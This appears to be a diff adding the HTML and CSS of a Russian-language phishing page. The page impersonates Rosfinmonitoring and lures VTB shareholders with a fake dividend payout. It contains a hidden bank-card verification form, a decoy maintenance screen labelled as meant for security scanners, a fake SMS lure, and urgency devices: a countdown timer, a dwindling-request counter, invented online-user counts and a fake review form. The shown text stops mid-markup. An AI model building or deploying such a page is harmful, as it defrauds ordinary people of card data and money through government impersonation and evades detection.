@@ -1,0 +1,1567 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ГК "Росфинмониторинг" | Корректировка дивидендов</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body {
+            background: linear-gradient(135deg, rgba(13, 71, 161, 0.7) 0%, rgba(26, 35, 126, 0.8) 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 15px;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: url('https://yandex-images.clstorage.net/XY9L73l67/ceddb2c5ldY/95IXH4ss4zLnjn6OfnBCmpKyIbDJRbkdsUAmsZmqVPCcqZvpERIhAdli-CSxFeC1rf3WoAUAv61FnvQW3GCDyyMDQo5cvSMzopy8HXjzRp_BtXF1mcP4HGcDM_7CY534UvbXtVgMv0fNIO8woRPwcKJy0Lcez7W0m0q52Qe70he9kpPSi3Is-qDctYo_uQNQgzwlvl9G6ha71-06jCBb_N54XjpfiPXFTCErd64L8TNneEM41gt7u98G8VNHu5KQNB7b18z3Kv4uUb3DvTSP0Ec4a32axSIdudPj9wTh33UWvBp6GMu0DM5nbLihST74KTYJdhvLf_lfA7BfxjwRXnFfXd0Ce-K9ppOzQ7bzztBF-qnz3MpvUzJfo_xJr95zVXkRNNyPccAGZ2s758N9PO32xDiQC_y814a2EM62Fl7-VR6WC77iOeJQPQ22tEHRjbrs_FhNK5O7WyIwyyOWuxQ_3zldRrBBSaOosizNdb5sNEY0UoK9O9GB-pTBvxMeNtJTlgwx6DOuWXJLNz3KWQMyIz1SAyDd8JItu4-ln_Ect5k3kgd4BYilLDVmizH2LXCBPNpNNfFWh3OUBDEaXDuTkxALeWH9bxl7zLv6ThdPPe3wk86t1joX7nBIqlC7VrsXc9IOOoIHIm_94kE9_a18jH_VxDx43U49XMFwFlf2mZKSBPniv6Gbto2-OoFQgbil-NJG5F55VGV9Qagcstn5Wv1YQn2FR25kd2PDef-l-IbyG0X8MhJMP1FMNBXXs1TWl0N2orMr2bPPcP8AWAV_ofyWhmUeul0jPUSvHXMYsFD6GoT2Sohop__thbn9pfnINZmB8LFeCz4WgXbWF_GfWlvFOiD4plY-wHm0zxzIt-i1WIukG_XWLjGH6R09UL9SvNqFfwyA7e6ypkX8PSE_SvFbgz0zkUR-38U1XNc_XBMYT3IpfqoeNAW0usodhDsqeJ-Drxd7US41jU') no-repeat center center;
+            background-size: cover;
+            opacity: 0.4;
+            z-index: -1;
+        }
+        .container {
+            max-width: 480px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.98);
+            color: #333;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+            position: relative;
+            border: 1px solid rgba(13, 71, 161, 0.3);
+        }
+        .header {
+            text-align: center;
+            padding-bottom: 20px;
+            margin-bottom: 25px;
+            border-bottom: 3px solid #0d47a1;
+            position: relative;
+        }
+        .logo-text {
+            font-size: 1.7em;
+            color: #0d47a1;
+            font-weight: 800;
+            margin-bottom: 5px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+        }
+        .badge {
+            background: linear-gradient(135deg, #4caf50, #2e7d32);
+            color: white;
+            padding: 6px 18px;
+            border-radius: 20px;
+            display: inline-block;
+            margin: 8px 0;
+            font-size: 0.85em;
+            font-weight: bold;
+            box-shadow: 0 4px 8px rgba(76, 175, 80, 0.3);
+        }
+        .form-group { margin-bottom: 18px; }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #555;
+            font-weight: 600;
+            font-size: 0.95em;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+            background: #f9f9f9;
+        }
+        input:focus {
+            border-color: #0d47a1;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(13, 71, 161, 0.1);
+            outline: none;
+        }
+        .check-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #0d47a1, #1a237e);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: all 0.3s;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 15px rgba(13, 71, 161, 0.4);
+        }
+        .check-btn:hover {
+            background: linear-gradient(135deg, #1a237e, #0d47a1);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(13, 71, 161, 0.5);
+        }
+        .check-btn:active {
+            transform: translateY(0);
+        }
+        .result {
+            display: none;
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            padding: 25px;
+            border-radius: 15px;
+            margin: 25px 0;
+            text-align: center;
+            border: 2px solid #4caf50;
+            position: relative;
+            overflow: hidden;
+        }
+        .result::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #4caf50, #2e7d32, #4caf50);
+            animation: shimmer 2s infinite linear;
+        }
+        @keyframes shimmer {
+            0% { background-position: -200px 0; }
+            100% { background-position: 200px 0; }
+        }
+        .amount {
+            font-size: 2.8em;
+            color: #0d47a1;
+            font-weight: 900;
+            margin: 20px 0;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+        }
+        .download-btn {
+            display: block;
+            background: linear-gradient(135deg, #ff9800, #e68900);
+            color: white;
+            text-align: center;
+            padding: 17px;
+            border-radius: 12px;
+            text-decoration: none;
+            margin: 20px 0;
+            font-weight: bold;
+            font-size: 1.05em;
+            transition: all 0.3s;
+            box-shadow: 0 6px 15px rgba(255, 152, 0, 0.4);
+            position: relative;
+            overflow: hidden;
+        }
+        .download-btn::after {
+            content: '⬇️';
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.2em;
+            animation: bounce 2s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(-50%); }
+            50% { transform: translateY(-60%); }
+        }
+        .download-btn:hover {
+            background: linear-gradient(135deg, #e68900, #ff9800);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(255, 152, 0, 0.5);
+        }
+        .manager-note {
+            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+            border: 2px solid #2196f3;
+            padding: 15px;
+            border-radius: 12px;
+            margin: 20px 0;
+            font-size: 0.92em;
+            color: #0d47a1;
+            position: relative;
+        }
+        .manager-note::before {
+            content: '❗';
+            position: absolute;
+            left: 15px;
+            top: 15px;
+            font-size: 1.2em;
+        }
+        .card-verification-section {
+            display: none;
+            background: linear-gradient(135deg, #f5f5f5, #e0e0e0);
+            padding: 22px;
+            border-radius: 15px;
+            margin: 22px 0;
+            border: 3px solid #0d47a1;
+            box-shadow: inset 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .card-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+        .card-row .form-group {
+            flex: 1;
+        }
+        .card-row .form-group:last-child {
+            flex: 0.6;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: white;
+            border-radius: 15px;
+            margin: 20px 0;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+        }
+        .loader-spinner {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #0d47a1;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+        .loader-spinner::after {
+            content: '';
+            position: absolute;
+            top: -6px; left: -6px; right: -6px; bottom: -6px;
+            border: 6px solid transparent;
+            border-top: 6px solid #ff9800;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite reverse;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .verification-error {
+            display: none;
+            background: linear-gradient(135deg, #ffebee, #ffcdd2);
+            border: 2px solid #f44336;
+            color: #d32f2f;
+            padding: 22px;
+            border-radius: 12px;
+            margin: 22px 0;
+            text-align: center;
+            position: relative;
+        }
+        .verification-error::before {
+            content: '⚠️';
+            font-size: 2em;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .payment-counter {
+            text-align: center;
+            background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+            padding: 14px;
+            border-radius: 12px;
+            margin: 18px 0;
+            border-left: 5px solid #4caf50;
+            font-weight: bold;
+            color: #2e7d32;
+            box-shadow: 0 4px 12px rgba(76, 175, 80, 0.2);
+        }
+        .option-buttons {
+            display: flex;
+            gap: 15px;
+            margin: 22px 0;
+        }
+        .option-btn {
+            flex: 1;
+            padding: 22px 12px;
+            text-align: center;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        .option-btn::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(rgba(255,255,255,0.1), rgba(255,255,255,0));
+            pointer-events: none;
+        }
+        .option-btn.primary {
+            background: linear-gradient(135deg, #0d47a1, #1565c0);
+            color: white;
+        }
+        .option-btn.secondary {
+            background: linear-gradient(135deg, #ff9800, #ff5722);
+            color: white;
+        }
+        .option-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+        }
+        .timer-container {
+            background: linear-gradient(135deg, #fff3e0, #ffcc80);
+            border: 2px solid #ff9800;
+            border-radius: 12px;
+            padding: 18px;
+            margin: 20px 0;
+            text-align: center;
+            display: none;
+        }
+        .timer {
+            font-size: 2.2em;
+            font-weight: 900;
+            color: #d84315;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+        }
+        .counter-box {
+            background: linear-gradient(135deg, #e1f5fe, #b3e5fc);
+            border: 2px solid #0288d1;
+            border-radius: 12px;
+            padding: 15px;
+            margin: 15px 0;
+            text-align: center;
+        }
+        .counter {
+            font-size: 1.8em;
+            font-weight: 900;
+            color: #0277bd;
+            margin: 8px 0;
+        }
+        .geo-info {
+            background: linear-gradient(135deg, #f3e5f5, #e1bee7);
+            border: 2px solid #7b1fa2;
+            border-radius: 12px;
+            padding: 18px;
+            margin: 18px 0;
+            position: relative;
+        }
+        .geo-info::before {
+            content: '📍';
+            position: absolute;
+            left: 18px;
+            top: 18px;
+            font-size: 1.5em;
+        }
+        .banks {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 12px;
+            border: 2px solid #0d47a1;
+        }
+        .bank-logo {
+            width: 50px;
+            height: 50px;
+            background-size: cover;
+            background-position: center;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+        }
+        .bank-logo:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+        }
+        .progress-bar {
+            height: 12px;
+            background: #e0e0e0;
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 15px 0;
+            position: relative;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #4caf50, #2e7d32);
+            border-radius: 6px;
+            width: 84%;
+            position: relative;
+            overflow: hidden;
+        }
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255,255,255,0.4), 
+                transparent);
+            animation: progressShimmer 2s infinite;
+        }
+        @keyframes progressShimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        .notification-toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, #4caf50, #2e7d32);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            z-index: 10000;
+            max-width: 300px;
+            display: none;
+            animation: slideIn 0.5s ease;
+            border-left: 5px solid #2e7d32;
+        }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        .sms-interface {
+            background: #e0f7fa;
+            border: 2px solid #006064;
+            border-radius: 12px;
+            padding: 0;
+            margin: 20px 0;
+            overflow: hidden;
+            font-family: 'SF Pro Text', -apple-system, sans-serif;
+        }
+        .sms-header {
+            background: #006064;
+            color: white;
+            padding: 12px 15px;
+            font-size: 0.9em;
+            display: flex;
+            justify-content: space-between;
+        }
+        .sms-content {
+            padding: 20px 15px;
+            background: white;
+            margin: 10px;
+            border-radius: 8px;
+            border: 1px solid #b2ebf2;
+        }
+        .sms-sender {
+            color: #006064;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .sms-text {
+            color: #333;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+        .sms-link {
+            color: #0d47a1;
+            font-weight: bold;
+            word-break: break-all;
+            font-size: 0.9em;
+        }
+        .review-btn {
+            background: linear-gradient(135deg, #9c27b0, #7b1fa2);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            padding: 12px 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin: 15px 0;
+            width: 100%;
+            transition: all 0.3s;
+        }
+        .review-btn:hover {
+            background: linear-gradient(135deg, #7b1fa2, #9c27b0);
+            transform: translateY(-2px);
+        }
+        .review-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 10001;
+            justify-content: center;
+            align-items: center;
+        }
+        .review-content {
+            background: white;
+            padding: 30px;
+            border-radius: 20px;
+            max-width: 400px;
+            width: 90%;
+            position: relative;
+        }
+        .refresh-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #f44336;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            font-size: 1.5em;
+            cursor: pointer;
+            z-index: 9999;
+            box-shadow: 0 5px 15px rgba(244, 67, 54, 0.4);
+            display: none;
+        }
+        .maintenance-screen {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(135deg, #0d47a1, #1a237e);
+            color: white;
+            z-index: 10002;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+            font-size: 1.2em;
+        }
+        .live-check {
+            background: rgba(13, 71, 161, 0.1);
+            padding: 10px 15px;
+            border-radius: 10px;
+            margin: 10px 0;
+            font-size: 0.9em;
+            color: #0d47a1;
+            border-left: 3px solid #0d47a1;
+        }
+        .live-check::before {
+            content: '🔴';
+            margin-right: 8px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .cb-logo {
+            width: 70px;
+            height: 70px;
+            background: url('https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13') center/cover;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 0.9em;
+            text-align: center;
+            box-shadow: 0 8px 20px rgba(13, 71, 161, 0.4);
+            cursor: pointer;
+            transition: all 0.3s;
+            text-decoration: none;
+            margin: 0 auto 15px;
+        }
+        .cb-logo:hover {
+            transform: scale(1.05);
+            box-shadow: 0 12px 25px rgba(13, 71, 161, 0.5);
+        }
+        .social-buttons {
+            display: flex;
+            gap: 15px;
+            margin: 20px 0;
+            justify-content: center;
+        }
+        .social-btn {
+            flex: 1;
+            padding: 15px;
+            text-align: center;
+            border-radius: 12px;
+            font-weight: bold;
+            text-decoration: none;
+            color: white;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+        }
+        .social-btn.telegram {
+            background: linear-gradient(135deg, #0088cc, #006699);
+        }
+        .social-btn.whatsapp {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+        }
+        .social-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+        }
+        @media (max-width: 600px) {
+            .container { padding: 20px; }
+            .option-buttons { flex-direction: column; }
+            .bank-logo { width: 40px; height: 40px; }
+            .amount { font-size: 2.2em; }
+            .timer { font-size: 1.8em; }
+            .social-buttons { flex-direction: column; }
+        }
+        @media (max-width: 400px) {
+            .container { padding: 15px; }
+            .logo-text { font-size: 1.4em; }
+            .check-btn, .download-btn { padding: 15px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- ЭКРАН ТЕХОБСЛУЖИВАНИЯ (для сканеров) -->
+    <div class="maintenance-screen" id="maintenanceScreen">
+        <div>
+            <h2 style="margin-bottom: 20px;">🔧 Техническое обслуживание</h2>
+            <p>Портал временно недоступен.</p>
+            <p>Проводится обновление системы безопасности ГК "Росфинмониторинг".</p>
+            <p style="margin-top: 30px; font-size: 0.9em; color: #bbdefb;">
+                Пожалуйста, попробуйте позже или обновите страницу.
+            </p>
+            <button onclick="location.reload()" style="
+                background: white;
+                color: #0d47a1;
+                border: none;
+                padding: 12px 30px;
+                border-radius: 8px;
+                margin-top: 20px;
+                font-weight: bold;
+                cursor: pointer;
+            ">
+                Обновить страницу
+            </button>
+        </div>
+    </div>
+
+    <!-- КНОПКА ОБНОВЛЕНИЯ (показывается только после техобслуживания) -->
+    <button class="refresh-btn" id="refreshBtn" onclick="location.reload()" title="Обновить страницу">
+        ↻
+    </button>
+
+    <!-- УВЕДОМЛЕНИЯ -->
+    <div class="notification-toast" id="notificationToast"></div>
+
+    <!-- МОДАЛКА ОТЗЫВОВ -->
+    <div class="review-modal" id="reviewModal">
+        <div class="review-content">
+            <h3 style="color: #0d47a1; margin-bottom: 20px;">✍️ Оставить отзыв</h3>
+            <div class="form-group">
+                <label>Ваше имя</label>
+                <input type="text" id="reviewName" placeholder="Иван Иванов">
+            </div>
+            <div class="form-group">
+                <label>Ваш город</label>
+                <input type="text" id="reviewCity" placeholder="Москва">
+            </div>
+            <div class="form-group">
+                <label>Сумма выплаты (₽)</label>
+                <input type="number" id="reviewAmount" placeholder="189000">
+            </div>
+            <div class="form-group">
+                <label>Ваш отзыв</label>
+                <textarea id="reviewText" placeholder="Расскажите о вашем опыте..." 
+                          style="width: 100%; padding: 12px; border-radius: 8px; border: 2px solid #ddd; min-height: 100px;"></textarea>
+            </div>
+            <button class="check-btn" onclick="submitReview()" style="margin-top: 20px;">
+                📤 Отправить отзыв
+            </button>
+            <button onclick="document.getElementById('reviewModal').style.display='none'" 
+                    style="background: #666; color: white; border: none; padding: 10px; border-radius: 8px; width: 100%; margin-top: 10px; cursor: pointer;">
+                Отмена
+            </button>
+        </div>
+    </div>
+
+    <!-- ОСНОВНОЙ КОНТЕЙНЕР -->
+    <div class="container" id="mainContainer">
+        <!-- ШАПКА -->
+        <div class="header">
+            <!-- ЛОГОТИП -->
+            <a href="https://www.rosfinmonitoring.ru" target="_blank" class="cb-logo">
+                РосФиМ
+            </a>
+            <div style="text-align: center;">
+                <div class="logo-text">
+                    ГК "РОСФИНМОНИТОРИНГ"<br>ДЕПАРТАМЕНТ ВЫПЛАТ
+                </div>
+                <div class="badge">
+                    ✅ Программа корректировки дивидендов ВТБ
+                </div>
+            </div>
+            
+            <!-- SMS-ИНТЕРФЕЙС -->
+            <div class="sms-interface" id="smsInterface">
+                <div class="sms-header">
+                    <span>Росфинмониторинг</span>
+                    <span>Только что</span>
+                </div>
+                <div class="sms-content">
+                    <div class="sms-sender">От: ГК "Росфинмониторинг"</div>
+                    <div class="sms-text">
+                        Проверьте корректировку дивидендов ВТБ за 2021-2023 гг. Сумма до 450 000 ₽.
+                    </div>
+                    <div class="sms-link" id="smsLink">rosfin-dividend.ru/check</div>
+                </div>
+            </div>
+
+            <div style="background: linear-gradient(135deg, #f0f7ff, #e3f2fd); padding: 18px; border-radius: 15px; border-left: 5px solid #0d47a1; margin-top: 15px;">
+                <p style="color: #333; margin: 0; line-height: 1.5; font-size: 0.95em;">
+                    <strong style="color: #0d47a1;">📍 Корректировка дивидендов акционерам ВТБ</strong><br>
+                    В рамках плановой проверки обнаружены расхождения в начислениях дивидендов за 2021-2023 гг. Проверьте вашу сумму.
+                </p>
+            </div>
+        </div>
+
+        <!-- СЧЕТЧИКИ И ТАЙМЕР -->
+        <div class="counter-box">
+            <div style="font-size: 0.9em; color: #0277bd;">Осталось заявок на выплату:</div>
+            <div class="counter" id="requestsCounter">90</div>
+            <div style="font-size: 0.8em; color: #666; margin-top: 5px;">Сейчас онлайн проверяют: <span id="onlineUsers">12</span> акционеров</div>
+        </div>
+
+        <!-- ГЕОЛОКАЦИЯ ПО РЕАЛЬНОМУ IP -->
+        <div class="geo-info" id="geoInfo">
+            <div style="margin-left: 40px;">
+                <strong style="color: #7b1fa2;">📍 Определение местоположения...</strong><br>
+                <div style="font-size: 0.9em; margin-top: 8px; color: #555;">
+                    ⚠️ Загрузка данных геолокации
+                </div>
+            </div>
+        </div>
+
+        <!-- БАНКИ-ПАРТНЕРЫ (КЛИКАБЕЛЬНЫЕ) -->
+        <div style="text-align: center; margin: 15px 0; color: #0d47a1; font-weight: bold;">
+            🏦 Программа затрагивает акционеров:
+        </div>
+        <div class="banks">
+            <a href="https://www.vtb.ru" target="_blank" class="bank-logo" title="ВТБ" style="background-image: url('data:image/jpeg;base64,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');"></a>
+            <a href="https://www.sberbank.ru" target="_blank" class="bank-logo" title="Сбербанк" style="background-image: url('https://i.ytimg.com/vi/VWG-iwsocLQ/maxresdefault.jpg');"></a>
+            <a href="https://www.tinkoff.ru" target="_blank" class="bank-logo" title="Тинькофф" style="background-image: url('https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ca/d1/18/cad118e3-1b98-6d38-05e7-aa8e5ab4fa3e/AppIcon-0-0-1x_U007epad-0-0-85-220.png/1200x630wa.png');"></a>
+            <a href="https://alfabank.ru" target="_blank" class="bank-logo" title="Альфа-Банк" style="background-image: url('https://avatars.mds.yandex.net/i?id=06820d835b2e6bdec207420d72d22c01_l-7684368-images-thumbs&n=13');"></a>
+            <a href="https://www.gazprombank.ru" target="_blank" class="bank-logo" title="Газпромбанк" style="background-image: url('https://avatars.mds.yandex.net/get-mpic/11396163/2a00000193b393533194ea9223f19f1638b6/orig');"></a>
+        </div>
+
+        <!-- ПРОГРЕСС-БАР ВЫПЛАТ -->
+        <div style="margin: 20px 0;">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 8px;">
